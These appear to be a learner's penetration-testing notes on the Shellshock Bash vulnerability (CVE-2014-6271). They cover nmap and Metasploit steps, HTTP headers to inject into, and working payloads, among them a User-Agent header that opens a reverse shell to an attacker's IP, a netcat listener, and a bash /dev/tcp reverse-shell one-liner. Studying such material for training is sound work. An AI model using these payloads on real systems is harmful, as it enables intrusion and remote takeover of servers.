### **<mark style="background: #f39c12;">Shellshock (CVE-2014-6271):</mark>** 
is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allow an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell.

---

**The Shellshock vulnerability:** is caused by a vulnerability in Bash, whereby Bash  
mistakenly executes trailing commands after a series of characters: **`() { :; };`**

In the context of remote exploitation, **Apache web servers configured to run CGI**  
**scripts or .sh scripts are also vulnerable to this attack.**  

<mark style="background: #8e44ad;">**CGI (Common Gateway Interface)**</mark> scripts are used by Apache to execute arbitrary 
commands on the Linux system, after which the output is displayed to the client.

---
### In order to exploit this vulnerability:
you will need to locate an **<mark style="background: #0b5345;">"input vector"</mark>** or <mark style="background: #0b5345;">**"script"**</mark>  **that allows you to communicate with Bash**.


### ** <mark style="background: #ABF7F7A6;">nmap scripts</mark>  to test if shellshock exists:**
**`http-shellshock --script-args uri=<target uri>`**

![[cgi_script.png]]

##### Example: `└─# nmap 192.89.14.3 --script=http-shellshock --script-args uri="http://192.89.14.3/gettime.cgi"`  
<br>
<br>  

### **<mark style="background: #FF5582A6;">MSF module</mark> :**

scans for shellshock vulnerability

- **`auxiliary/scanner/http/apache_mod_cgi_bash_env`**


exploits it

- **`exploit/multi/http/apache_mod_cgi_bash_env`**

1. Set the RHOSTS to the target webapp  
2. Set the TARGETURI to the cgi path: `set TARGETURI /gettime.cgi`  
3. Set the LHOSTS to ur local IP (Not loopback)
### ***Exploiting via HTTP header in CGI request,***  there is various http headers to inject :

- **User-Agent**
- **Referer**
- **X-Forwarded-For**
- **X-Requested-With**
- **Host**
- **Cookie**
- **Accept**

### **Example:** `User-Agent : () { :; }; /bin/bash -c "echo hacked"`

#### you might need to use echo :

**`User-Agent : () { :; }; echo; echo; /bin/bash -c "echo hacked"`**

### Example for creating a <mark style="background: #e74c3c;">reverse shell</mark>:
Listen to a port with Netcat:
- `nc -lvnp 7777`

Then put this in the User Agent field in Burb Suite:
- `User-Agent : () { :; }; echo; echo; /bin/bash -c "sh -i >& /dev/tcp/192.141.236.2/7777 0>&1"` Change to ur IP and port listening to

#### Simple bash reverse shell command :

**`bash -i >& /dev/tcp/<ip>/<port> 0>&1`**

# Create Reverse Shells easily: 
<mark style="background: #f1c40f;">🔙🐚</mark> https://www.revshells.com/ 